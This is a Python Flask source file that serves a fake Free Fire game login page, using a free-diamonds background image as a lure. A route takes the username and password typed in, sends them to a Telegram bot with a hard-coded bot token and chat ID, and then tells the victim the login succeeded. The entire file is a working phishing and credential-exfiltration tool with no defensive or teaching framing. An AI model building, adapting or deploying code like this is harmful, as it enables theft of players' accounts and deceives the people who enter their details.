from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# Your Telegram Bot Token & Chat ID
BOT_TOKEN = "7906618866:AAETn74tnTIZHCY4gZq8GQ2ocAX6vInl5Ns"
CHAT_ID = "5850410801"

# Route to display the fake login page
@app.route("/", methods=["GET"])
def login_page():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Login</title>
    <style>
        /* Set background image */
        body {
            background-image: url('https://i0.wp.com/dktechhindi.net/wp-content/uploads/2025/02/Free-Fire-Diamond-Free-Claim.webp?w=1200&ssl=1');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        
        /* Style the login box */
        .container {
            border-radius: 5px;
        }
        
        button {
            background-color: #ff4500;
            color: white;
            font-size: 16px;
            cursor: pointer;
            border: none;
            text-align: center;
            background: rgba(255, 255, 255, 0.8); /* Light transparent background */
            width: 300px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
        }
        
        /* Style input fields and button */
        input, button {
            margin: 10px 0;
            padding: 10px;
            width: 90%;
            border: 1px solid #ccc;
        }
        
        button:hover {
            background-color: #cc3700;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Free Fire Logo -->
        <img src="https://play-lh.googleusercontent.com/yEF4rXrIlcxy27PjtpiWJyP8OGDsSJ0ZupnCJNC83l-gsaAtoI3Ku4NQebERov0W28_E=s48-rw" width="75">
        <h2>Free Fire Login</h2>
        
        <!-- Login Form -->
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Enter your Free Fire ID" required><br>
            <input type="password" name="password" placeholder="Enter your password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>

</body>
</html>

    """

# Route to capture login details & send to Telegram
@app.route("/login", methods=["POST"])
def capture_login():
    username = request.form.get("username")
    password = request.form.get("password")

    if username and password:
        message = f"🔥 Free Fire Login Attempt 🔥\n👤 Username: {username}\n🔑 Password: {password}"
        telegram_api = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_api, data={"chat_id": CHAT_ID, "text": message})

        return "Login Successful!", 200

    return "Invalid Data", 400

# Run the Flask app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)